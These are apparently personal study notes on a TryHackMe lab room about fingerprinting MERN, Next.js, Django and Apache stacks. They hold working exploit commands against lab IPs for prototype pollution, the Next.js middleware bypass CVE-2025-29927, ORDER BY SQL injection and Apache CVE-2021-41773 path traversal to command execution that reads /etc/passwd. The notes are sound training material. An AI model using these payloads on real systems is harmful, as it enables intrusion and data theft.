https://tryhackme.com/room/modernwebstacks

### Table of contents
- [[#Intro]]
- [[#MERN]]
- [[#React / Next.js]]
- [[#Django]]
- [[#LAMP]]
- [[#Automation - `nikto`]]
- [[#CVE Summary]]

___
### Intro
[[#Table of contents|Back to the top]]

**Stack:** **collection of software** used for web development that incorporates at least an **OS**, a programming **language**, **database** software and web **server**

___
### MERN
[[#Table of contents|Back to the top]]

MongoDB, Express.js, React, Node.js

On Ubuntu, Express listening on port 3000 or 5000, MongoDB on port 27017

##### Fingerprinting MERN

`curl -I 10.129.188.95:3000/`

In response, look for

| Signal                    | Value                                  | Confidence |
| ------------------------- | -------------------------------------- | ---------- |
| `X-Powered-By` header     | `Express`                              | High       |
| `Set-Cookie` header       | `connect.sid=s%3A...`                  | High       |
| Unhandled route response* | `Cannot GET /nonexistent` (plain text) | High       |
| Frontend root element     | In the HTML body                       | Medium     |
*\* if the page doesn't exist on the website for instance (test with `/nonexistent`), Django returns HTML error, Apache 403/404, Next.js HTML page with styled error*

##### Exploiting MERN

Next step: API surface enumeration
MERN apps commonly **expose JSON** APIs for **profile updates**, **preferences**, **user settings**
--> [[4 Prototype Pollution|prototype pollution]]

*Example*

| Endpoint           | Method | Purpose                                          |
| ------------------ | ------ | ------------------------------------------------ |
| `/api/user/update` | POST   | Accepts JSON, merges it into session user object |
| `/api/admin/flag`  | GET    | Returns flag if requesting user has admin access |

```Shell
curl -b cookies.txt -X POST http://10.129.188.95:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
```
*returns `{"status":"updated"}`, indicating endpoint accepts arbitrary JSON keys, merges into user object --> this is attack surface*

JS objects inherit from `Object.prototype`
Merge function receives `{"proto": {"isAdmin": true}}` without filtering keys (here `proto`) --> prototype includes value true for isAdmin, every object inherits that property
If proto is filtered, then try `{"constructor": {"prototype": {"isAdmin": true}}}`

___
### React / Next.js
[[#Table of contents|Back to the top]]

Next.js most common React framework. On Ubuntu, runs under Node.js process under dedicated user (`node`/`www-data`), typically started with `npm start` / `npm run build`

##### Fingerprinting Next.js

`curl -I http://10.129.188.95:3001/`

In response, look for 

| Signal                      | Value                                         | Confidence                 |
| --------------------------- | --------------------------------------------- | -------------------------- |
| `X-Powered-By` header       | `Next.js`                                     | High                       |
| HTML source                 | **`window.__next_f`**  in `script` tag**      | High (confirms App Router) |
| Static asset paths          | `/_next/static/chunks/`                       | High                       |
| Middleware headers          | `x-middleware-next` or `x-middleware-rewrite` | Medium                     |
| Redirect to protected route | HTTP 307 to `/login`                          | Medium                     |
\** most reliable

##### CVE-2025-29927: Middleware Bypass

Middleware function runs before every request reaches page, used as gatekeeper, authentication checker, session validator, redirector, ... --> most common place for access controls in Next.js apps

Next.js uses `x-middleware-subrequest` to prevent infinite loops
Example: middleware called on modified request to another route --> Next.js attaches header to request so it doesn't run middleware on request again

Flaw: doesn't check if header comes from internal process or external client

```Shell
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.129.188.95:3001/dashboard
```

If app uses `/src` directory structure, header value changes to `src/middleware` repeated five times --> check whether `middleware.ts` lives at project root or inside `src/`

___
### Django
[[#Table of contents|Back to the top]]

Python-native alternative framework to Node.js
On Ubuntu, runs under Gunicorn / Django's dev server, typically on port 8000

##### Fingerprinting Django

`curl -I "http://10.82.95.115:8000/products/"`

In response, look for

| Signal                          | Value                                     | Confidence |
| ------------------------------- | ----------------------------------------- | ---------- |
| `Server` header                 | `WSGIServer/0.2 CPython/X.X.X`            | High       |
| `Cookie` name                   | `csrftoken`                               | High       |
| `X-Frame-Options` header        | `DENY`*                                   | High       |
| `X-Content-Type-Options` header | `nosniff`*                                | High       |
| `Referrer-Policy` header        | `same-origin`*                            | Medium     |
| HTML source (any `POST` form)   | **`csrfmiddlewaretoken` hidden field**\** | High       |
\* 3 combined indicates Django SecurityMiddleware
\** most reliable

`curl -s "http://10.129.188.95:8000/products/"`
- hidden `csrfmiddlewaretoken`
- `order` parameter: injection point

`updatexml()` works because `DEBUG = True` is set in `settings.py`, if not --> fall back on `SLEEP()` (blind time-based injection)

Payloads
```Shell
curl -s "http://10.129.188.95:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'

curl -s "http://10.129.188.95:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
```

___
### LAMP
[[#Table of contents|Back to the top]]

Linux, Apache, MySQL, PHP: open-source, stable, easy, reliable
On Ubuntu, Apache runs under `www-data`, serves files from `/var/www/html`, passes dynamic requests to PHP through `mod_php` or PHP-FPM, MySQL stores app data, while PHP handles server-side logic

##### Fingerprinting LAMP

`curl -I http://10.129.188.95:8080/`
--> `Server: Apache/2.4.49 (Unix)`

`curl -v http://10.129.188.95:8080/cgi-bin/ 2>&1`
--> 403 Forbidden: exists, disabled listing

|Signal|Value|Confidence|
|---|---|---|
|`Server` header|Apache/2.4.49 (Unix)|High - exact CVE match|
|404 error page footer|Apache/2.4.49 version string|High|
|`/cgi-bin/` response|403 Forbidden (not 404)|High - `mod_cgi` enabled|

##### CVE-2021-41773

Apache 2.4.49 changed `ap_normalize_path()` --> broke path traversal filter which should block URL containing `../`

--> send `.%2e/` (literal dot, followed by URL-encoded dot and `/`) to bypass filter

```Shell
curl -s --path-as-is "http://10.129.188.95:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; id'
```
*`--path-as-is` is required otherwise `curl` cleans up `.%2e/`*

```Shell
curl -s --path-as-is "http://10.129.188.95:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```

```Shell
curl -s --path-as-is "http://10.129.188.95:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
```

___
### Automation - `nikto`
[[#Table of contents|Back to the top]]

MERN - Port 3000
```Shell
nikto -h http://10.129.188.95:3000
```

Next.js - Port 3001
```Shell
nikto -h http://10.129.188.95:3001
```

Django - Port 8000
```Shell
nikto -h http://10.129.188.95:8000
```

Apache - Port 8080
```Shell
nikto -h http://10.129.188.95:8080
```

___
### CVE Summary
[[#Table of contents|Back to the top]]

| Stack              | CVE            | Impact                                       | CVSS         |
| ------------------ | -------------- | -------------------------------------------- | ------------ |
| MERN / Express     | CVE-2020-8203  | Prototype pollution → auth bypass            | 7.4 High     |
| Next.js Middleware | CVE-2025-29927 | Single header → full middleware bypass       | 9.1 Critical |
| Django ORM         | CVE-2021-35042 | SQL injection via unparameterised `ORDER BY` | 9.8 Critical |
| Apache LAMP        | CVE-2021-41773 | Path traversal + `mod_cgi` RCE               | 9.8 Critical |
